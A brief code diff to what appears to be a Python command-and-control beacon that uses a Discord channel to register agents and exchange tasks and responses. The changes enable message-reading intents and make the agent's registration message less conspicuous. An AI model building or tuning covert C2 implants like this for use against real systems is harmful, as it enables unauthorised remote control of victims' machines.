@@ -18,7 +18,11 @@ taskKeyName = beaconId + ':TaskForYou'
 respKeyName = beaconId + ':RespForYou'
 
 # Initialize Discord client
-client = discord.Client(intents=discord.Intents.default())
+intents = discord.Intents.default()
+intents.messages = True
+intents.message_content = True
+
+client = discord.Client(intents=intents)
 
 #####################
 # Encoder functions #
@@ -71,7 +75,7 @@ async def registerClient():
     """
     channel = client.get_channel(CHANNEL_ID)
     keyName = f"AGENT:{beaconId}"
-    await channel.send(f'[+] Registering new agent {keyName}')
+    await channel.send(f'{keyName}')
     print(f"[+] Registered new agent {keyName}")
 
 #####################
